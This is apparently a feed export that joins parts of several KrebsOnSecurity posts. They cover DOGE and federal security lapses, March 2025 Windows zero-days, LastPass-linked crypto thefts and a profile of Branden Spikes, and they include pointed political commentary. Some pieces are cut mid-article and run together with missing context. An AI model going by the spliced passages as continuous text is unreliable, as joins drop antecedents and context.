rehired and put on leave to send a password-protected email attachment with sensitive personal data.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70736\" style=\"width: 760px;\"><img alt=\"\" class=\" wp-image-70736\" height=\"490\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/uscis-probation.png\" width=\"750\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70736\">A message from the White House to fired federal employees at the U.S. Citizenship and Immigration Services instructs recipients to email personal information in a password-protected attachment.</p></div>\n<p>This is hardly the first example of the administration discarding Security 101 practices in the name of expediency. Last month, the <strong>Central Intelligence Agency</strong> (CIA) sent an unencrypted email to the White House with the first names and first letter of the last names of recently hired CIA officers who might be easy to fire.</p>\n<p>As cybersecurity journalist <strong>Shane Harris</strong> <a href=\"https://www.theatlantic.com/international/archive/2025/02/doge-intelligence-agencies-harm/681667/\" rel=\"noopener\" target=\"_blank\">noted</a> in <em>The Atlantic</em>, even those fragments of information could be useful to foreign spies.</p>\n<p>&#8220;Over the weekend, a former senior CIA official showed me the steps by which a foreign adversary who knew only his first name and last initial could have managed to identify him from the single line of the congressional record where his full name was published more than 20 years ago, when he became a member of the Foreign Service,&#8221; Harris wrote. &#8220;The former official was undercover at the time as a State Department employee. If a foreign government had known even part of his name from a list of confirmed CIA officers, his cover would have been blown.&#8221;</p>\n<p>The White House has also fired at least 100 intelligence staffers from the <strong>National Security Agency </strong>(NSA), reportedly for using an internal NSA chat tool <a href=\"https://www.nytimes.com/2025/02/25/us/politics/gabbard-nsa-firing-explicit-chat.html\" rel=\"noopener\" target=\"_blank\">to discuss their personal lives and politics</a>. Testifying before the House Select Committee on the Communist Party earlier this month, the NSA&#8217;s former top cybersecurity official said the Trump administration&#8217;s attempts to mass fire probationary federal employees will be &#8220;devastating&#8221; to U.S. cybersecurity operations.</p>\n<p><strong>Rob Joyce</strong>, who spent 34 years at the NSA, told Congress how important those employees are in sustaining an aggressive stance against China in cyberspace.</p>\n<p>&#8220;At my former agency, remarkable technical talent was recruited into developmental programs that provided intensive unique training and hands-on experience to cultivate vital skills,” Joyce <a href=\"https://cyberscoop.com/joyce-china-probationary-firings-devastating-congress/?utm_campaign=CyberScoop%20-%20Editorial&amp;utm_content=326616240&amp;utm_medium=social&amp;utm_source=linkedin&amp;hss_channel=lcp-11061843\" rel=\"noopener\" target=\"_blank\">told the panel</a>. &#8220;Eliminating probationary employees will destroy a pipeline of top talent responsible for hunting and eradicating [Chinese] threats.&#8221;</p>\n<p>Both the message to fired CISA workers and DOGE&#8217;s ongoing efforts to bypass vetted government networks for a faster Wi-Fi signal are emblematic of this administration&#8217;s overall approach to even basic security measures: To go around them, or just pretend they don&#8217;t exist <a href=\"https://fs.blog/chestertons-fence/\" rel=\"noopener\" target=\"_blank\">for a good reason</a>.</p>\n<p>On Monday, <em>The New York Times</em> <a href=\"https://www.nytimes.com/2025/03/17/us/politics/elon-musk-starlink-white-house.html\" rel=\"noopener\" target=\"_blank\">reported</a> that U.S. Secret Service agents at the White House were briefly on alert last month when a trusted captain of Elon Musk&#8217;s &#8220;Department of Government Efficiency&#8221; (DOGE) visited the roof of the Eisenhower building inside the White House compound &#8212; to see about setting up a dish to receive satellite Internet access directly from Musk&#8217;s <strong>Starlink</strong> service.</p>\n<p>The White House press secretary told The Times that Starlink had &#8220;donated&#8221; the service and that the gift had been vetted by the lawyer overseeing ethics issues in the White House Counsel’s Office. The White House claims the service is necessary because its wireless network is too slow.</p>\n<p><strong>Jake Williams</strong>, vice president for research and development at the cybersecurity consulting firm <strong>Hunter Strategy</strong>, told The Times &#8220;it&#8217;s super rare” to install Starlink or another internet provider as a replacement for existing government infrastructure that has been vetted and secured.</p>\n<p>&#8220;I can’t think of a time that I have heard of that,&#8221; Williams said. &#8220;It introduces another attack point,” Williams said. &#8220;But why introduce that risk?&#8221;</p>\n<p>Meanwhile, <strong>NBC News</strong> <a href=\"https://www.nbcnews.com/tech/elon-musk/elon-musk-starlink-growing-footprint-federal-government-rcna195400\" rel=\"noopener\" target=\"_blank\">reported on March 7</a> that Starlink is expanding its footprint across the federal government.</p>\n<p>&#8220;Multiple federal agencies are exploring the idea of adopting SpaceX’s Starlink for internet access — and at least one agency, the General Services Administration (GSA), has done so at the request of Musk’s staff, according to someone who worked at the GSA last month and is familiar with its network operations — despite a vow by Musk and Trump to slash the overall federal budget,&#8221; NBC wrote.<span id=\"more-70729\"></span></p>\n<p>The longtime Musk employee who encountered the Secret Service on the roof in the White House complex was <strong>Christopher Stanley</strong>, the 33-year-old senior director for security engineering at <strong>X</strong> and principal security engineer at SpaceX.</p>\n<p>On Monday, Bloomberg broke the news that Stanley had been tapped for a seat on the board of directors at the mortgage giant <strong>Fannie Mae</strong>. Stanley was added to the board alongside newly confirmed Federal Housing Finance Agency director <a href=\"https://en.wikipedia.org/wiki/Bill_Pulte\" rel=\"noopener\" target=\"_blank\">Bill Pulte</a>, the grandson of the late housing businessman and founder of PulteGroup &#8212; William J. Pulte.</p>\n<p>In a nod to his new board role atop an agency that helps drive the nation&#8217;s $12 trillion mortgage market, Stanley retweeted a Bloomberg story about the hire with a smiley emoji and the comment &#8220;Tech Support.&#8221;</p>\n<p><img alt=\"\" class=\"aligncenter wp-image-70750\" height=\"676\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/stanley-fannie.png\" width=\"750\" /></p>\n<p>But earlier today, Bloomberg <a href=\"https://www.bloomberg.com/news/articles/2025-03-19/musk-ally-stanley-abruptly-resigns-from-fannie-mae-board\" rel=\"noopener\" target=\"_blank\">reported</a> that Stanley had abruptly resigned from the Fannie board, and that details about the reason for his quick departure weren&#8217;t immediately clear. As <a href=\"https://krebsonsecurity.com/2025/02/trump-2-0-brings-cuts-to-cyber-consumer-protections/\" rel=\"noopener\" target=\"_blank\">first reported here</a> last month, Stanley had a brush with celebrity on Twitter in 2015 when he leaked the user database for the DDoS-for-hire service <strong>LizardStresser</strong>, and soon faced threats of physical violence against his family.</p>\n<p>My <a href=\"https://krebsonsecurity.com/2015/01/another-lizard-arrested-lizard-lair-hacked/\" rel=\"noopener\" target=\"_blank\">2015 story on that leak</a> did not name Stanley, but he exposed himself as the source by posting a video about it on his Youtube channel. A review of domain names registered by Stanley shows he went by the nickname “enKrypt,” and was the former owner of a pirated software and hacking forum called <strong>error33[.]net</strong>, as well as <strong>theC0re</strong>, a video game cheating community.</p>\n<p>Stanley is one of more than 50 DOGE workers, mostly young men and women who have worked with one or more of Musk&#8217;s companies. The Trump administration remains <a href=\"https://krebsonsecurity.com/2025/02/teen-on-musks-doge-team-graduated-from-the-com/\" rel=\"noopener\" target=\"_blank\">dogged by questions</a> about how many &#8212; if any &#8212; of the DOGE workers were put through the gauntlet of a thorough security background investigation before being given access to such sensitive government databases.</p>\n<p>That&#8217;s largely because in one of his first executive actions after being sworn in for a second term on Jan. 20, President Trump <a href=\"https://www.whitehouse.gov/presidential-actions/2025/01/memorandum-to-resolve-the-backlog-of-security-clearances-for-executive-office-of-the-president-personnel/\" rel=\"noopener\" target=\"_blank\">declared</a> that the security clearance process was simply too onerous and time-consuming, and that anyone so designated by the White House counsel would have full top secret/sensitive compartmented information (TS/SCI) clearances for up to six months. Translation: We <a href=\"https://www.youtube.com/watch?v=9IG3zqvUqJY\" rel=\"noopener\" target=\"_blank\">accepted the risk</a>, so TAH-DAH! No risk!</p>\n<p>Presumably, this is the same counsel who saw no ethical concerns with Musk &#8220;donating&#8221; Starlink to the White House, or with President Trump summoning the media to film him hawking Cybertrucks and Teslas (a.k.a. &#8220;Teslers&#8221;) on the White House lawn last week.</p>\n<div style=\"text-align: center;\"></div>\n<p>Mr. Musk&#8217;s unelected role as head of an ad hoc executive entity that is gleefully firing federal workers and feeding federal agencies into &#8220;the wood chipper&#8221; has seen his Tesla stock price plunge in recent weeks, while firebombings and other vandalism attacks on property carrying the Tesla logo are cropping up across the U.S. and overseas and driving down Tesla sales.</p>\n<p>President Trump and his attorney general Pam Bondi have dubiously asserted that those responsible for attacks on Tesla dealerships are committing &#8220;domestic terrorism,&#8221; and that vandals will be prosecuted accordingly. But it&#8217;s not clear this administration would recognize a real domestic security threat if it was ensconced squarely behind the Resolute Desk.</p>\n<p>Or at the pinnacle of the <strong>Federal Bureau of Investigation</strong> (FBI). <em>The Washington Post</em> <a href=\"https://www.washingtonpost.com/national-security/2025/02/07/patel-fbi-russia-lopatonok/\" rel=\"noopener\" target=\"_blank\">reported</a> last month that Trump&#8217;s new FBI director <strong>Kash Patel</strong> was paid $25,000 last year by a film company owned by a dual U.S. Russian citizen that has made programs promoting &#8220;deep state&#8221; conspiracy theories pushed by the Kremlin.</p>\n<p>&#8220;The resulting six-part documentary appeared on Tucker Carlson’s online network, itself a reliable conduit for Kremlin propaganda,&#8221; The Post reported. &#8220;In the film, Patel made his now infamous pledge to shut down the FBI’s headquarters in Washington and &#8216;open it up as a museum to the deep state.'&#8221;</p>\n<p>When the head of the FBI is promising to turn his own agency headquarters into a mocking public exhibit on the U.S. National Mall, it may seem silly to fuss over the White House&#8217;s clumsy and insulting instructions to former employees they unlawfully fired.</p>\n<p>Indeed, one consistent feedback I&#8217;ve heard from a subset of readers here is something to this effect: &#8220;I used to like reading your stuff more when you weren&#8217;t writing about politics all the time.&#8221;</p>\n<p>My response to that is: &#8220;Yeah, me too.&#8221; It&#8217;s not that I&#8217;m suddenly interested in writing about political matters; it&#8217;s that various actions by this administration keep intruding on my areas of coverage.</p>\n<p>A less charitable interpretation of that reader comment is that anyone still giving such feedback is either dangerously uninformed, being disingenuous, or just doesn’t want to keep being reminded that they’re on the side of the villains, despite all the evidence showing it.</p>\n<p>Article II of the U.S. Constitution unambiguously states that the president shall take care that the laws be faithfully executed. But almost from Day One of his second term, Mr. Trump has been acting in violation of his sworn duty as president by choosing not to enforce laws passed by Congress (TikTok ban, anyone?), by freezing funds already allocated by Congress, and most recently by flouting a federal court order while simultaneously <a href=\"https://www.nytimes.com/2025/03/19/us/politics/trump-deportations-constitutional-crisis-impeachment.html\" rel=\"noopener\" target=\"_blank\">calling for the impeachment of the judge who issued it</a>. Sworn to uphold, protect and defend The Constitution, President Trump appears to be creating new constitutional challenges with almost each passing day.</p>\n<p>When Mr. Trump was voted out of office in November 2020, he turned to baseless claims of widespread &#8220;election fraud&#8221; to explain his loss &#8212; with deadly and long-lasting consequences. This time around, the rallying cry of DOGE and White House is &#8220;government fraud,&#8221; which gives the administration a certain amount of cover for its actions among a base of voters that has long sought to shrink the size and cost of government.</p>\n<p>In reality, &#8220;government fraud&#8221; has become a term of derision and public scorn applied to anything or anyone the current administration doesn&#8217;t like. If DOGE and the White House were truly interested in trimming government waste, fraud and abuse, they could scarcely do better than consult the inspectors general fighting it at various federal agencies.</p>\n<p>After all, the inspectors general likely know exactly where a great deal of the federal government&#8217;s fiscal skeletons are buried. Instead, Mr. Trump <a href=\"https://www.cbsnews.com/news/trump-firings-watchdogs-inspectors-general-60-minutes/\" rel=\"noopener\" target=\"_blank\">fired at least 17 inspectors general</a>, leaving the government without critical oversight of agency activities. That action is unlikely to stem government fraud; if anything, it will only encourage such activity.</p>\n<p>As <em>Techdirt</em> founder <strong>Mike Masnick</strong> noted in a recent column &#8220;<a href=\"https://www.techdirt.com/2025/03/04/why-techdirt-is-now-a-democracy-blog-whether-we-like-it-or-not/\" rel=\"noopener\" target=\"_blank\">Why Techdirt is Now a Democracy Blog (Whether We Like it or Not)</a>,&#8221; when the very institutions that made American innovation possible are being systematically dismantled, it’s not a &#8220;political&#8221; story anymore: It’s a story about whether the environment that enabled all the other stories we cover will continue to exist.</p>\n<p>&#8220;This is why tech journalism’s perspective is so crucial right now,&#8221; Masnick wrote. &#8220;We’ve spent decades documenting how technology and entrepreneurship can either strengthen or undermine democratic institutions. We understand the dangers of concentrated power in the digital age. And we’ve watched in real-time as tech leaders who once championed innovation and openness now actively work to consolidate control and dismantle the very systems that enabled their success.&#8221;</p>\n<p>&#8220;But right now, the story that matters most is how the dismantling of American institutions threatens everything else we cover,&#8221; Masnick continued. &#8220;When the fundamental structures that enable innovation, protect civil liberties, and foster open dialogue are under attack, every other tech policy story becomes secondary.&#8221;</p>",

Both require the attacker to trick a target into mounting a malicious virtual hard disk. CVE-2025-24993 would lead to the possibility of local code execution, while CVE-2025-24991 could cause NTFS to disclose portions of memory.</p>\n<p>Microsoft credits researchers at <strong>ESET</strong> with reporting the zero-day bug labeled <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-24983\" rel=\"noopener\" target=\"_blank\">CVE-2025-24983</a>, an elevation of privilege vulnerability in older versions of Windows. ESET said the exploit was deployed via the <a href=\"https://www.kaspersky.com/about/press-releases/kaspersky-uncovers-pipemagic-backdoor-attacks-businesses-through-fake-chatgpt-application\" rel=\"noopener\" target=\"_blank\">PipeMagic backdoor</a>, capable of exfiltrating data and enabling remote access to the machine.</p>\n<p>ESET&#8217;s <strong>Filip</strong> <b>Jurčacko </b>said the exploit in the wild targets only older versions of Windows OS: Windows 8.1 and Server 2012 R2. Although still used by millions, security support for these products ended more than a year ago, and mainstream support ended years ago. However, ESET notes the vulnerability itself also is present in newer Windows OS versions, including <strong>Windows 10 build 1809</strong> and the still-supported <strong>Windows Server 2016</strong>.</p>\n<p>Rapid7&#8217;s lead software engineer <strong>Adam Barnett</strong> said <strong>Windows 11</strong> and <strong>Server 2019</strong> onwards are not listed as receiving patches, so are presumably not vulnerable.</p>\n<p>&#8220;It’s not clear why newer Windows products dodged this particular bullet,&#8221; Barnett wrote. &#8220;The Windows 32 subsystem is still presumably alive and well, since there is no apparent mention of its demise on the Windows client OS deprecated features list.&#8221;<span id=\"more-70681\"></span></p>\n<p>The zero-day flaw <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-24984\" rel=\"noopener\" target=\"_blank\">CVE-2025-24984</a> is another NTFS weakness that can be exploited by inserting a malicious USB drive into a Windows computer. Barnett said Microsoft&#8217;s advisory for this bug doesn&#8217;t quite join the dots, but successful exploitation appears to mean that portions of heap memory could be improperly dumped into a log file, which could then be combed through by an attacker hungry for privileged information.</p>\n<p>&#8220;A relatively low CVSSv3 base score of 4.6 reflects the practical difficulties of real-world exploitation, but a motivated attacker can sometimes achieve extraordinary results starting from the smallest of toeholds, and Microsoft does rate this vulnerability as important on its own proprietary severity ranking scale,&#8221; Barnett said.</p>\n<p>Another zero-day fixed this month &#8212; <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-24985\" rel=\"noopener\" target=\"_blank\">CVE-2025-24985</a> &#8212; could allow attackers to install malicious code. As with the NTFS bugs, this one requires that the user mount a malicious virtual hard drive.</p>\n<p>The final zero-day this month is <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-26633\" rel=\"noopener\" target=\"_blank\">CVE-2025-26633</a>, a weakness in the <strong>Microsoft Management Console</strong>, a component of Windows that gives system administrators a way to configure and monitor the system. Exploiting this flaw requires the target to open a malicious file.</p>\n<p>This month&#8217;s bundle of patch love from Redmond also addresses six other vulnerabilities Microsoft has rated &#8220;critical,&#8221; meaning that malware or malcontents could exploit them to seize control over vulnerable PCs with no help from users.</p>\n<p>Barnett observed that this is now the sixth consecutive month where Microsoft has published zero-day vulnerabilities on Patch Tuesday without evaluating any of them as critical severity at time of publication.</p>\n<p>The <a href=\"https://isc.sans.edu/forums/diary/Microsoft%20Patch%20Tuesday%3A%20March%202025/31756/\" rel=\"noopener\" target=\"_blank\">SANS Internet Storm Center</a> has a useful list of all the Microsoft patches released today, indexed by severity.

        "content": "<p>In September 2023, KrebsOnSecurity published findings from security researchers who concluded that a series of six-figure cyberheists across dozens of victims resulted from thieves cracking master passwords stolen from the password manager service <strong>LastPass</strong> in 2022. In a court filing this week, U.S. federal agents investigating a spectacular $150 million cryptocurrency heist said they had reached the same conclusion.</p>\n<p><img alt=\"\" class=\"aligncenter size-medium wp-image-31264\" height=\"132\" src=\"https://krebsonsecurity.com/wp-content/uploads/2015/06/lastpass-580x132.png\" width=\"580\" /></p>\n<p>On March 6, federal prosecutors in northern California said they seized approximately $24 million worth of cryptocurrencies that were clawed back following a $150 million cyberheist on Jan. 30, 2024. The complaint refers to the person robbed only as &#8220;Victim-1,&#8221; but according to blockchain security researcher <strong>ZachXBT</strong> the theft was perpetrated against <strong>Chris Larsen</strong>, the co-founder of the cryptocurrency platform <strong>Ripple</strong>. ZachXBT was the <a href=\"https://x.com/zachxbt/status/1752694489905528943\" rel=\"noopener\" target=\"_blank\">first to report on the heist</a>.</p>\n<p>This week&#8217;s action by the government merely allows investigators to officially seize the frozen funds. But there is an important conclusion in this seizure document: It basically says the <strong>U.S. Secret Service</strong> and the <strong>FBI</strong> agree with the findings of <a href=\"https://krebsonsecurity.com/2023/09/experts-fear-crooks-are-cracking-keys-stolen-in-lastpass-breach/\" rel=\"noopener\" target=\"_blank\">the LastPass breach story published here in September 2023</a>.</p>\n<p>That piece quoted security researchers who said they were witnessing six-figure crypto heists several times each month that all appeared to be the result of crooks cracking master passwords for the password vaults stolen from LastPass in 2022.</p>\n<p>&#8220;The Federal Bureau of Investigation has been investigating these data breaches, and law enforcement agents investigating the instant case have spoken with FBI agents about their investigation,&#8221; reads the seizure complaint, which was written by a U.S. Secret Service agent. &#8220;From those conversations, law enforcement agents in this case learned that the stolen data and passwords that were stored in several victims’ online password manager accounts were used to illegally, and without authorization, access the victims’ electronic accounts and steal information, cryptocurrency, and other data.&#8221;</p>\n<p>The document continues:</p>\n<p>&#8220;Based on this investigation, law enforcement had probable cause to believe the same attackers behind the above-described commercial online password manager attack used a stolen password held in Victim 1’s online password manager account and, without authorization, accessed his cryptocurrency wallet/account.&#8221;</p>\n<p>Working with dozens of victims, security researchers <strong>Nick Bax</strong> and <strong>Taylor Monahan</strong> found that none of the six-figure cyberheist victims appeared to have suffered the sorts of attacks that typically preface a high-dollar crypto theft, such as the compromise of one’s email and/or mobile phone accounts, or SIM-swapping attacks.</p>\n<p>They discovered the victims all had something else in common: Each had at one point stored their cryptocurrency seed phrase &#8212; the secret code that lets anyone gain access to your cryptocurrency holdings &#8212; in the &#8220;Secure Notes&#8221; area of their LastPass account prior to the 2022 breaches at the company.</p>\n<p>Bax and Monahan found another common theme with these robberies: They all followed a similar pattern of cashing out, rapidly moving stolen funds to a dizzying number of drop accounts scattered across various cryptocurrency exchanges.</p>\n<p>According to the government, a similar level of complexity was present in the $150 million heist against the Ripple co-founder last year.</p>\n<p>&#8220;The scale of a theft and rapid dissipation of funds would have required the efforts of multiple malicious actors, and was consistent with the online password manager breaches and attack on other victims whose cryptocurrency was stolen,&#8221; the government wrote. &#8220;For these reasons, law enforcement agents believe the cryptocurrency stolen from Victim 1 was committed by the same attackers who conducted the attack on the online password manager, and cryptocurrency thefts from other similarly situated victims.&#8221;</p>\n<p>Reached for comment, LastPass said it has seen no definitive proof &#8212; from federal investigators or others &#8212; that the cyberheists in question were linked to the LastPass breaches.</p>\n<p>&#8220;Since we initially disclosed this incident back in 2022, LastPass has worked in close cooperation with multiple representatives from law enforcement,&#8221; LastPass said in a written statement. &#8220;To date, our law enforcement partners have not made us aware of any conclusive evidence that connects any crypto thefts to our incident. In the meantime, we have been investing heavily in enhancing our security measures and will continue to do so.&#8221;<span id=\"more-70634\"></span></p>\n<p>On August 25, 2022, <strong>LastPass CEO Karim Toubba</strong> told users the company had detected unusual activity in its software development environment, and that the intruders stole some source code and proprietary LastPass technical information. On Sept. 15, 2022, LastPass said an investigation into the August breach determined the attacker did not access any customer data or password vaults.</p>\n<p>But on Nov. 30, 2022, LastPass notified customers about another, far more serious security incident that the company said leveraged data stolen in the August breach. LastPass disclosed that criminal hackers had compromised encrypted copies of some password vaults, as well as other personal information.</p>\n<p>Experts say the breach would have given thieves &#8220;offline&#8221; access to encrypted password vaults, theoretically allowing them all the time in the world to try to crack some of the weaker master passwords using powerful systems that can attempt millions of password guesses per second.</p>\n<p>Researchers found that many of the cyberheist victims had chosen master passwords with relatively low complexity, and were among LastPass&#8217;s oldest customers. That&#8217;s because legacy LastPass users were more likely to have master passwords that were protected with far fewer &#8220;iterations,&#8221; which refers to the number of times your password is run through the company&#8217;s encryption routines. In general, the more iterations, the longer it takes an offline attacker to crack your master password.</p>\n<p>Over the years, LastPass forced new users to pick longer and more complex master passwords, and they increased the number of iterations on multiple occasions by several orders of magnitude. But researchers found strong indications that LastPass never succeeded in upgrading many of its older customers to the newer password requirements and protections.</p>\n<p>Asked about LastPass&#8217;s continuing denials, Bax said that after the initial warning in our 2023 story, he naively hoped people would migrate their funds to new cryptocurrency wallets.</p>\n<p>&#8220;While some did, the continued thefts underscore how much more needs to be done,&#8221; Bax told KrebsOnSecurity. &#8220;It&#8217;s validating to see the Secret Service and FBI corroborate our findings, but I’d much rather see fewer of these hacks in the first place. ZachXBT and <a href=\"https://x.com/_SEAL_Org/status/1868805837311074576\" rel=\"noopener\" target=\"_blank\">SEAL 911 reported yet another wave of thefts</a> as recently as December, showing the threat is still very real.&#8221;</p>\n<p>Monahan said LastPass still hasn’t alerted their customers that their secrets—especially those stored in “Secure Notes”—may be at risk.</p>\n<p>&#8220;Its been two and a half years since LastPass was first breached [and] hundreds of millions of dollars has been stolen from individuals and companies around the globe,&#8221; Monahan said. &#8220;They could have encouraged users to rotate their credentials. They could’ve prevented millions and millions of dollars from being stolen by these threat actors. But  instead they chose to deny that their customers were are risk and blame the victims instead.&#8221;</p>",

        "content": "<p>At 49, <strong>Branden Spikes</strong> isn&#8217;t just one of the oldest technologists who has been involved in Elon Musk&#8217;s <strong>Department of Government Efficiency</strong> (DOGE). As the current director of information technology at <strong>X/Twitter</strong> and an early hire at <strong>PayPal</strong>, <strong>Zip2</strong>,<strong> Tesla</strong> and <strong>SpaceX</strong>, Spikes is also among Musk&#8217;s most loyal employees. Here&#8217;s a closer look at this trusted Musk lieutenant, whose Russian ex-wife was once married to Elon&#8217;s cousin.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70586\" style=\"width: 601px;\"><img alt=\"\" class=\"size-full wp-image-70586\" height=\"533\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/x-spikes.png\" width=\"591\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70586\">The profile of Branden Spikes on X.</p></div>\n<p>When President Trump took office again in January, he put the world&#8217;s richest man &#8212; Elon Musk &#8212; in charge of the <strong>U.S. Digital Service</strong>, and renamed the organization as DOGE. The group is reportedly staffed by <a href=\"https://www.nytimes.com/interactive/2025/02/27/us/politics/doge-staff-list.html\" rel=\"noopener\" target=\"_blank\">at least 50 technologists</a>, many of whom have ties to Musk&#8217;s companies.</p>\n<p>DOGE has been enabling the president&#8217;s ongoing mass layoffs and firings of federal workers, largely by seizing control over computer systems and government data for a multitude of federal agencies, including the Social Security Administration, the Department of Homeland Security, the Office of Personnel Management, and the Treasury Department.</p>\n<p>It is difficult to find another person connected to DOGE who has stronger ties to Musk than Branden Spikes. A native of California, Spikes initially teamed up with Musk in 1997 as a lead systems engineer for the software company Zip2, the first major venture for Musk. In 1999, Spikes was hired as director of IT at PayPal, and in 2002 he became just the fourth person hired at SpaceX.</p>\n<p>In 2012, Spikes launched <strong>Spikes Security</strong>, a software product that sought to create a compartmentalized or &#8220;sandboxed&#8221; web browser that could insulate the user from malware attacks. A review of spikes.com in the Wayback Machine shows that as far back as 1998, Musk could be seen joining Spikes for team matches in the online games Quake and Quake II. In 2016, Spikes Security was merged with another security suite called Aurionpro, with the combined company renamed Cyberinc.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70608\" style=\"width: 758px;\"><img alt=\"\" class=\" wp-image-70608\" height=\"682\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/spikesquake.png\" width=\"748\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70608\">A snapshot of spikes.com from 1998 shows Elon Musk&#8217;s profile in Spike&#8217;s clan for the games Quake and Quake II.</p></div>\n<p>Spikes&#8217;s <a href=\"https://www.linkedin.com/in/brandenspikes/\" rel=\"noopener\" target=\"_blank\">LinkedIn profile</a> says he was appointed head of IT at X in February 2025. And although his name shows up on none of the lists of DOGE employees circulated by various media outlets, multiple sources told KrebsOnSecurity that Spikes was working with DOGE and operates within Musk&#8217;s inner circle of trust.</p>\n<p>In a conversation with KrebsOnSecurity, Spikes said he is dedicated to his country and to saving it from what he sees as certain ruin.</p>\n<p>&#8220;Myself, I was raised by a southern conservative family in California and I strongly believe in America and her future,&#8221; Spikes said. &#8220;This is why I volunteered for two months in DC recently to help DOGE save us from certain bankruptcy.&#8221;</p>\n<p>Spikes told KrebsOnSecurity that he recently decided to head back home and focus on his job as director of IT at X.</p>\n<p>&#8220;I loved it, but ultimately I did not want to leave my hometown and family back in California,&#8221; Spikes said of his tenure at DOGE. &#8220;After a couple of months it became clear that to continue helping I would need to move to DC and commit a lot more time, so I politely bowed out.&#8221;</p>\n<p>Prior to founding Spikes Security, Branden Spikes was married to a native Russian woman named <strong>Natalia</strong> whom he&#8217;d met at a destination wedding in South America in 2003.</p>\n<p>Branden and Natalia&#8217;s names are both on the registration records for the domain name <strong>orangetearoom[.]com</strong>. This domain, which DomainTools.com says was originally registered by Branden in 2009, is the home of a tax-exempt charity in Los Angeles called the <a href=\"https://web.archive.org/web/20141221061648/http://www.russiancalifornia.org/\" rel=\"noopener\" target=\"_blank\"><strong>California Russian Association</strong></a>.</p>\n<p>Here is a photo from a 2011 event organized by the California Russian Association, showing Branden and Natalia at one of its &#8220;White Nights&#8221; charity fundraisers:</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_70585\" style=\"width: 759px;\"><img alt=\"\" class=\" wp-image-70585\" height=\"564\" src=\"https://krebsonsecurity.com/wp-content/uploads/2025/03/spikes-heritage.png\" width=\"749\" /><p class=\"wp-caption-text\" id=\"caption-attachment-70585\">Branden and Natalia Spikes, on left, in 2011.

That is not her maiden name, which appears to be &#8220;Libina.&#8221; Rather, Natalia acquired the surname Haldeman in 1998, when she married Elon Musk&#8217;s cousin.</p>\n<p><strong>Reeve Haldeman</strong> is the son of <strong>Scott Haldeman</strong>, who is the brother of Elon Musk&#8217;s mother, <strong>Maye Musk</strong>.

The person on the right in that image &#8212; <strong>Ivan Y. Podvalov</strong> &#8212; appears in many fundraising event photos published by the foundation over the past decade. Podvalov is a board member of the <strong>Congress of Russian Americans</strong> (CRA), a nonprofit group that is known for vehemently opposing U.S. financial and legal sanctions against Russia.</p>\n<p>Writing for <em>The Insider</em> in 2022, journalist <strong>Diana Fishman</strong> described how the CRA has engaged in outright political lobbying, noting that the organization in June 2014 sent a letter to President Obama and the secretary of the United Nations, calling for an end to the &#8220;large-scale US intervention in Ukraine and the campaign to isolate Russia.&#8221;</p>\n<p>&#8220;The US military contingents must be withdrawn immediately from the Eastern European region, and NATO&#8217;s enlargement efforts and provocative actions against Russia must cease,” the message read.</p>\n<p>The Insider said the CRA director sent another two letters, this time to President Donald Trump, in 2017 and 2018.</p>\n<p>&#8220;One was a request not to sign a law expanding sanctions against Russia,&#8221; Fishman <a href=\"https://theins.ru/en/politics/256825\" rel=\"noopener\" target=\"_blank\">wrote</a>. &#8220;The other regretted the expulsion of 60 Russian diplomats from the United States and urged not to jump to conclusions on Moscow&#8217;s involvement in the poisoning of Sergei Skripal.&#8221;</p>\n<p>The nonprofit tracking website CauseIQ.com <a href=\"https://www.causeiq.com/organizations/russian-heritage-foundation,831537424/\" rel=\"noopener\" target=\"_blank\">reports</a> that The Russian Heritage Foundation, Inc. is now known as <strong>Constellation of Humanity</strong>.</p>\n<p>The Russian Heritage Foundation and the California Russian Association both promote the interests of <a href=\"https://cepa.org/article/an-unorthodox-russian-vision-of-heaven-and-hell/\" rel=\"noopener\" target=\"_blank\">the Russian Orthodox Church</a>. <a href=\"https://web.archive.org/web/20141119232054/http://www.russiancalifornia.org/russian-orthodox-church-orange-county/\" rel=\"noopener\" target=\"_blank\">This page</a> indexed by Archive.org from russiancalifornia.org shows The California Russian Foundation organized a community effort to establish an Orthodox church in Orange County, Calif.</p>\n<p>A press release from the <strong>Russian Orthodox Church Outside of Russia</strong> (ROCOR) shows that in 2021 the Russian Heritage Foundation <a href=\"https://www.rocorstudies.org/2021/03/09/russian-heritage-foundation-supports-our-work/\" rel=\"noopener\" target=\"_blank\">donated money</a> to organize a conference for the Russian Orthodox Church in Serbia.</p>\n<p>A review of the &#8220;<a href=\"https://orangetearoom.com/index.php/network/about-us\" rel=\"noopener\" target=\"_blank\">Partners</a>&#8221; listed on the Spikes&#8217; jointly registered domain &#8212; orangetearoom.com &#8212; shows the organization worked with a marketing company called <strong>Russian American Media</strong>. <a href=\"https://krebsonsecurity.com/2024/03/a-close-up-look-at-the-consumer-data-broker-radaris/\" rel=\"noopener\" target=\"_blank\">Reporting by KrebsOnSecurity last year</a> showed that Russian American Media also partners with the problematic people-search service <strong>Radaris</strong>, which was formed by two native Russian brothers in Massachusetts who have built a fleet of consumer data brokers and Russian affiliate programs.</p>\n<p>When asked about his ex-wife&#8217;s history, Spikes said she has a good heart and bears no ill-will toward anyone.</p>\n<p>&#8220;I attended several of Natalia&#8217;s social events over the years we were together and can assure you that she&#8217;s got the best intentions with those,&#8221; Spikes told KrebsOnSecurity. &#8220;There&#8217;s no funny business going on. It is just a way for those friendly immigrants to find resources amongst each other to help get settled in and chase the American dream. I mean, they&#8217;re not unlike the immigrants from other countries who come to America and try to find each other and help each other find others who speak the language and share in the building of their businesses here in America.&#8221;</p>\n<p>Spikes said his own family roots go back deeply into American history, sharing that his 6th great grandfather was Alexander Hamilton on his mom&#8217;s side, and Jessie James on his dad&#8217;s side.</p>\n<p>&#8220;My family roots are about as American as you can get,&#8221; he said. &#8220;I&#8217;ve also been 